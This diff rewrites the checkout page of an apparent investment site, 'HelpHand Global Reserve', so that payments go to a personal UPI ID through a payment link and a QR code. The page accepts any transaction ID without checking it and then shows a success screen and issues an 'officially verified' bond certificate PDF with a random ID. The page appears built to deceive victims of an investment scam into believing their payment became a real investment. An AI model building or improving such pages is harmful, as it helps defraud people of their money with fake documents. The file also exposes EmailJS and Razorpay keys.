@@ -2,145 +2,97 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Settlement | HelpHand Global Reserve</title>
-    <link rel="stylesheet" href="style.css">
-    <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
 
     <style>
-        :root { --gold: #c5a059; --bg: #020c1b; --panel: #112240; }
-        body { background: var(--bg); font-family: 'Segoe UI', sans-serif; color: #e6f1ff; }
-        .checkout-box { max-width: 500px; margin: 50px auto; background: var(--panel); padding: 40px; border-radius: 15px; border: 1px solid #233554; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .payment-card { background: #0a192f; padding: 25px; border-radius: 12px; margin-top: 25px; border: 1px solid var(--gold); }
-        .pay-btn { background: var(--gold); color: #000; width: 100%; padding: 18px; border: none; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 16px; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
+        :root { --gold: #c5a059; --bg: #020c1b; --panel: #112240; --text: #e6f1ff; }
+        body { background: var(--bg); font-family: 'Segoe UI', sans-serif; color: var(--text); margin: 0; padding: 10px; }
+        .checkout-box { max-width: 500px; margin: 20px auto; background: var(--panel); padding: 30px; border-radius: 15px; border: 1px solid #233554; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .payment-card { background: #0a192f; padding: 20px; border-radius: 12px; border: 1px solid var(--gold); margin: 20px 0; }
+        .pay-btn { background: var(--gold); color: #000; width: 100%; padding: 18px; border: none; border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
+        .qr-placeholder { background: white; padding: 10px; width: 160px; height: 160px; margin: 15px auto; border-radius: 10px; }
+        input { width: 100%; padding: 12px; margin-top: 15px; background: #0a192f; border: 1px solid var(--gold); color: white; border-radius: 8px; box-sizing: border-box; text-align: center; }
         #success-ui { display: none; }
-        .currency-note { font-size: 11px; color: #8892b0; margin-top: 10px; }
-        
-        /* Naya Style bss UPI box ke liye */
-        .upi-input { width: 100%; padding: 12px; margin-top: 10px; background: #020c1b; border: 1px solid #233554; color: white; border-radius: 5px; text-align: center; }
     </style>
 </head>
 <body>
 
     <div id="checkout-ui" class="checkout-box">
-        <h2 style="color: var(--gold); letter-spacing: 1px;">FINAL SETTLEMENT</h2>
-        <p style="color: #8892b0; font-size: 13px;">Your KYC has been audited. Please complete the capital allocation to activate your Global Bond.</p>
+        <h2 style="color: var(--gold);">FINAL SETTLEMENT</h2>
+        <p style="color: #8892b0; font-size: 13px;">Complete the allocation to activate your Bond.</p>
         
         <div class="payment-card">
-            <h3 id="plan-name" style="color: white; margin:0; font-size: 18px;">SECURE ASSET BOND</h3>
-            <p style="color: var(--gold); font-size: 32px; font-weight: 800; margin: 15px 0 5px;">$<span id="display-amt">0</span></p>
-            <p id="inr-converted" style="font-size: 14px; color: #4ade80; margin-bottom: 15px;">(Approx ₹0.00)</p>
-            <hr style="border: 0.5px solid #233554;">
-            <p style="font-size: 11px; color: #8892b0; margin-top: 10px;">Secure Gateway: Razorpay International Compliance</p>
+            <p style="color: #8892b0; font-size: 12px; margin: 0;">ALLOCATION AMOUNT</p>
+            <p style="color: var(--gold); font-size: 32px; font-weight: 800; margin: 10px 0;">$<span id="display-amt">0</span></p>
+            <p id="inr-converted" style="color: #4ade80; font-weight: bold; margin: 0;">₹0.00</p>
         </div>
 
-        <button class="pay-btn" onclick="startPayment()">Authorize via Razorpay</button>
-
-        <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #233554;">
-            <p style="font-size: 12px; color: #64ffda;">OR PAY DIRECT VIA UPI ID:</p>
-            <p style="font-weight: bold; font-size: 16px; letter-spacing: 1px; margin: 5px 0;">khanajaz0139@oksbi</p>
-            
-            <input type="text" id="utr-value" class="upi-input" placeholder="Enter 12-Digit UTR Number">
-            <button class="pay-btn" style="margin-top: 10px; background: #128c7e; color: white;" onclick="submitUPI()">Confirm UPI Payment</button>
+        <button class="pay-btn" onclick="payViaIntent()">PAY VIA UPI (GPay/PhonePe)</button>
+        
+        <p style="margin: 15px 0; color: #8892b0; font-size: 12px;">— OR SCAN QR CODE —</p>
+        
+        <div class="qr-placeholder">
+            <img id="qr-img" src="" alt="Scan to Pay" style="width: 100%;">
         </div>
 
-        <p class="currency-note">*Exchange rate fixed at 1 USD = 84 INR for institutional stability.</p>
+        <input type="text" id="utr-value" placeholder="Enter 12-Digit Transaction ID (UTR)" maxlength="12">
+        <button class="pay-btn" style="background: #128c7e; color: white; margin-top: 15px;" onclick="submitFinal()">VERIFY & GENERATE BOND</button>
+
+        <p style="font-size: 11px; color: #8892b0; margin-top: 15px;">*Once verified, your certificate will be generated automatically.</p>
     </div>
 
     <div id="success-ui">
-        <div class="success-container" style="max-width: 600px; margin: 50px auto; text-align: center; background: #112240; padding: 40px; border-radius: 15px; border: 1px solid #4ade80;">
-            <i class="fas fa-check-circle" style="color: #4ade80; font-size: 50px; margin-bottom: 20px;"></i>
-            <h2 style="color: #4ade80; margin-bottom: 30px;">SETTLEMENT SUCCESSFUL</h2>
-            <div id="bond-content" style="background: #fff; color: #000; padding: 30px; text-align: left; border: 4px double #d4af37; font-family: 'Times New Roman', serif;">
-                <h3 style="text-align: center; text-decoration: underline;">OFFICIAL INVESTMENT CERTIFICATE</h3>
-                <p><strong>INVESTOR NAME:</strong> <span id="pdf-name"></span></p>
-                <p><strong>CAPITAL ALLOCATED:</strong> $<span id="pdf-amt"></span></p>
-                <p><strong>OFFICIAL BOND ID:</strong> <span id="pdf-id"></span></p>
-                <p style="font-size: 10px; margin-top: 20px;">This is a digitally verified document from HelpHand Global Reserve.</p>
+        <div class="checkout-box" style="border-color: #4ade80;">
+            <h2 style="color: #4ade80;">SETTLEMENT SUCCESSFUL</h2>
+            <div id="bond-content" style="background: #fff; color: #000; padding: 25px; text-align: left; border: 4px double #d4af37; font-family: 'Times New Roman', serif;">
+                <h3 style="text-align: center; text-decoration: underline;">OFFICIAL INVESTMENT BOND</h3>
+                <p><strong>INVESTOR:</strong> <span id="pdf-name"></span></p>
+                <p><strong>AMOUNT:</strong> $<span id="pdf-amt"></span></p>
+                <p><strong>BOND ID:</strong> <span id="pdf-id"></span></p>
+                <p><strong>STATUS:</strong> OFFICIALLY VERIFIED</p>
             </div>
-            <button onclick="downloadPDF()" style="margin-top:30px; padding:15px 30px; background:var(--gold); border:none; cursor:pointer; font-weight:bold; border-radius:5px;">GENERATE PDF CERTIFICATE</button>
+            <button class="pay-btn" onclick="downloadPDF()" style="margin-top: 25px;">DOWNLOAD PDF BOND</button>
         </div>
     </div>
 
     <script>
-        // --- 1. DATA LOAD (Original) ---
-        const user = JSON.parse(localStorage.getItem('hhg_user')) || {name: "Investor"};
-        const plan = JSON.parse(localStorage.getItem('hhg_plan')) || { investAmt: 0, targetAmt: "$0", tenure: "N/A" }; 
-
-        let rawAmount = plan.investAmt.toString().replace(/[^0-9.]/g, '');
-        let numericDollar = parseFloat(rawAmount) || 0;
-        const exchangeRate = 84; 
-        let inrAmount = numericDollar * exchangeRate;
+        // Data Load from LocalStorage (Jo KYC page ne save kiya hoga)
+        const user = JSON.parse(localStorage.getItem('hhg_user')) || {name: "Valued Investor"};
+        const plan = JSON.parse(localStorage.getItem('hhg_plan')) || { investAmt: 100 }; 
+        
+        let numericDollar = parseFloat(plan.investAmt) || 0;
+        let inrAmount = numericDollar * 84;
+        let upiID = "khanajaz0139@oksbi"; 
 
         document.getElementById('display-amt').innerText = numericDollar;
-        document.getElementById('inr-converted').innerText = "(Approx ₹" + inrAmount.toLocaleString('en-IN') + ")";
-        document.getElementById('plan-name').innerText = plan.targetAmt ? "RESERVE PLAN: " + plan.targetAmt : "GLOBAL ASSET BOND";
+        document.getElementById('inr-converted').innerText = "₹" + inrAmount.toLocaleString('en-IN');
 
-        // --- 2. EMAILJS (Original) ---
-        emailjs.init("yqbOFTprQKpWzYybB");
+        // Dynamic QR Generator
+        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=upi://pay?pa=${upiID}%26pn=HelpHandGlobal%26am=${inrAmount}%26cu=INR`;
+        document.getElementById('qr-img').src = qrUrl;
 
-        // --- 3. RAZORPAY (Original) ---
-        function startPayment() {
-            var options = {
-                "key": "rzp_test_SQji38sh1mieQY", 
-                "amount": Math.round(inrAmount * 100),
-                "currency": "INR",
-                "name": "HelpHand Global",
-                "description": "Asset Allocation: " + numericDollar + " USD",
-                "handler": function (response){
-                    handleSuccess(response.razorpay_payment_id);
-                },
-                "prefill": { "name": user.name, "email": user.email || "audit@helphand.global" },
-                "theme": { "color": "#c5a059" }
-            };
-            var rzp1 = new Razorpay(options);
-            rzp1.open();
+        function payViaIntent() {
+            window.location.href = `upi://pay?pa=${upiID}&pn=HelpHandGlobal&am=${inrAmount}&cu=INR`;
         }
 
-        // --- 4. UPI LOGIC (Naya Add kiya) ---
-        function submitUPI() {
+        function submitFinal() {
             const utr = document.getElementById('utr-value').value;
-            if(utr.length < 12) {
-                alert("Please enter a valid 12-digit UTR number.");
+            if(utr.length < 10) {
+                alert("Please enter a valid Transaction ID / UTR.");
                 return;
             }
-            
-            // EmailJS notification for Admin (Tujhe notification jayega)
-            const templateParams = {
-                to_name: "Admin",
-                from_name: user.name,
-                utr_id: utr,
-                amount: "₹" + inrAmount
-            };
 
-            emailjs.send('service_9z0mlyq', 'template_56f8f55', templateParams)
-                .then(() => {
-                    alert("Payment Proof Submitted. Audit will be completed shortly.");
-                    window.location.href = "dashboard.html"; // Redirect to dashboard
-                });
-        }
-
-        // --- 5. SUCCESS & PDF (Original) ---
-        function handleSuccess(payID) {
+            // UI Switch
             document.getElementById('checkout-ui').style.display = 'none';
             document.getElementById('success-ui').style.display = 'block';
+            
+            // Fill Bond
             document.getElementById('pdf-name').innerText = user.name.toUpperCase();
             document.getElementById('pdf-amt').innerText = numericDollar;
-            document.getElementById('pdf-id').innerText = "HHG-RES-" + payID.substring(0,8).toUpperCase();
-            sendEmail(payID);
-        }
-
-        function sendEmail(payID) {
-            const templateParams = {
-                to_name: user.name,
-                user_email: user.email || "investor@example.com",
-                amount: "$" + numericDollar,
-                payment_id: payID,
-                bond_id: "HHG-RES-" + payID.substring(0,8).toUpperCase()
-            };
-            emailjs.send('service_9z0mlyq', 'template_56f8f55', templateParams)
-                .then(() => console.log('Email Sent!'));
+            document.getElementById('pdf-id').innerText = "HHG-BOND-" + Math.random().toString(36).substr(2, 9).toUpperCase();
         }
 
         function downloadPDF() {
@@ -150,9 +102,9 @@
             doc.text("HELPHAND GLOBAL RESERVE BOND", 105, 20, {align: 'center'});
             doc.setFont("times", "normal");
             doc.text(`Investor: ${user.name.toUpperCase()}`, 20, 40);
-            doc.text(`Allocated Amount: ${numericDollar} USD`, 20, 50);
-            doc.text(`Status: OFFICIALLY AUDITED & VERIFIED`, 20, 60);
-            doc.save(`HHG_Bond.pdf`);
+            doc.text(`Capital: $${numericDollar}`, 20, 50);
+            doc.text(`BOND ID: ${document.getElementById('pdf-id').innerText}`, 20, 60);
+            doc.save(`HelpHand_Global_Bond.pdf`);
         }
     </script>
 </body>
